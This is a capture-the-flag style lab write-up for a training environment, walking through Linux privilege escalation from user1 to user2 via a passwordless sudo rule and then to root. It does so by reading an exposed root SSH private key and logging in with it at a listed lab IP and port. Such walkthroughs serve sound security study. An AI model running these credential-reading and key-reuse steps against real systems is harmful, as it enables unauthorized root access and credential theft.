# Lab 001 — Linux Privilege Escalation: user1 → user2 → root

**Status:** ✅ Completed (user-reported root login and flag capture)  
**Target (historical lab):** `154.57.164.81` · **SSH port:** `36763`  
**Techniques:** `sudo -l`, group-scoped sudo, SUID enumeration, file permissions, exposed SSH key, `chmod 600`, `ssh -i`

[← Lab index](../INDEX.md) · [Linux PrivEsc study guide](../Topics-for-Studies/Linux-Privilege-Escalation.md) · [Home](../README.md)

> Authorized training environment only. Key contents, lab passwords and flags are excluded. The final root login and flag were reported successful; exact final shell output was not supplied.

## 10. Completed practical walkthrough

### Objective and recorded outcome

- **Initial identity:** `user1`.
- **First goal:** change to `user2` and retrieve `/home/user2/flag.txt`.
- **Second goal completed during practice:** obtain a root login through an exposed SSH private key; final flag obtained.
- **Target lab IP:** `154.57.164.81`.
- **External SSH port actually used for the root-key attempt:** `36763`.
- **Provided initial login:** `user1` and a lab-provided password (not repeated in these notes).

### Stage A — SSH into `user1`

```
ssh -p 36763 user1@154.57.164.81
# Enter the lab-provided password when prompted.
whoami
```

The port was observed in the later actual connection attempt; the original user1 connection may have used the same exposed port.

### Stage B — Enumerate and switch to `user2`

```
sudo -l
```

Actual permission:

```
(user2 : user2) NOPASSWD: /bin/bash
```

Use exactly the permitted user/group and binary:

```
sudo -u user2 -g user2 /bin/bash
whoami
id
cd /home/user2
ls -lah
cat /home/user2/flag.txt
```

Observed `id`:

```
uid=1001(user2) gid=1001(user2) groups=1001(user2)
```

Observed home listing:

```
total 4.0K
drwxr-xr-x. 1 user2 user2 22 Feb 12  2021 .
drwxr-xr-x. 1 root  root  19 Feb 12  2021 ..
-rw-------. 1 user2 user2 38 Feb 12  2021 flag.txt
```

`flag.txt` was readable by `user2`. Flag **contents are deliberately excluded**; outcome was confirmed by the user.

### Stage C — Tests that did not produce root

```
sudo /bin/bash
sudo -l
sudo -n -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/
ps auxww
cat /etc/os-release
```

Findings:

- `sudo /bin/bash`: requested user2 password and rejected attempts.
- `sudo -n -l`: `sudo: a password is required`.
- SUID scan: standard-looking entries, listed above.
- `getcap -r / 2>/dev/null`: no printed capability entries.
- `/etc/crontab`: did not exist in this container.
- OS: `Ubuntu 20.04.1 LTS (Focal Fossa)`.
- `ps auxww`: mostly SSH sessions, Bash, and prior commands; root-owned `sudo` processes did **not** imply a root shell.

### Stage D — Discover exposed root SSH private key

```
ls -la /root/.ssh
cat /root/.ssh/id_rsa
```

The world-readable private key combined with group access to `/root/.ssh` was the decisive finding.

### Stage E — Save and protect a local key copy

Use `vim root_key`, paste the **whole** key including actual `BEGIN` and `END` marker lines, then:

```
chmod 600 root_key
ls -l root_key
ssh-keygen -y -f root_key > /dev/null
```

The course hint **“Don't forget the chmod”** matched this step.

### Stage F — Connect as root over the external SSH endpoint

```
ssh -i root_key -p 36763 root@154.57.164.81
whoami
id
```

The user reported **success and retrieval of the flag** after fixing the key format. The exact root shell transcript and flag text were not provided, so they are not fabricated here.

---

## 11. Troubleshooting and lessons

| Symptom / output                                             | Meaning                                                                    | Resolution                                                                                                                     |
| ------------------------------------------------------------ | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| `ssh: connect to host localhost port 22: Connection refused` | No SSH listener reachable at `localhost:22` in the target container        | Use the external lab IP and assigned custom port from the attacking machine                                                    |
| `Load key "root_key": error in libcrypto`                    | SSH could not parse private-key contents                                   | Re-copy entire key including `BEGIN` and `END` lines; preserve original line breaks; validate with `ssh-keygen -y -f root_key` |
| `root@HOST's password:`                                      | The client fell back to password authentication, often after a key failure | Validate the key, its permissions, and public-key authorization; inspect `ssh -v`                                              |
| `Enter passphrase for key`                                   | Private key itself is encrypted                                            | Supply the key's passphrase if known; this is not the root account password                                                    |
| `WARNING: UNPROTECTED PRIVATE KEY FILE!`                     | Local private-key file is too accessible                                   | `chmod 600 root_key`                                                                                                           |
| `sudo: a password is required`                               | No matching passwordless sudo route for the command                        | Check authorized `sudo -l` entries; do not assume user1's sudo permission extends to user2                                     |
| `ls: cannot access .../.ssh: No such file or directory`      | That path doesn't exist                                                    | Check other accounts' directories where access is permitted                                                                    |
| `Stopped sudo -l`                                            | A shell job was suspended (e.g., `Ctrl+Z`)                                 | `jobs` to inspect; `fg` to resume, or clean up as appropriate                                                                  |

### The critical copy/paste mistake

During practice, only the material *between* the `-----BEGIN ...-----` and `-----END ...-----` lines was initially copied. SSH returned **`error in libcrypto`**. Copying both marker lines along with all encoded key lines fixed the format problem.

### Why `chmod 600` was used on the attacking machine

The exposed root private key on the target was `644` (insecure). The saved attacking-machine copy needed `600` so the SSH client would consider it suitably protected. Changing mode on one copy does **not** fix the original exposure on the target.

### Why a root-owned process is not automatically root access

The `ps auxww` output showed `root` owning supervisory SSH and sudo processes; your effective identity remained `user2` until the separate successful root authentication.

---
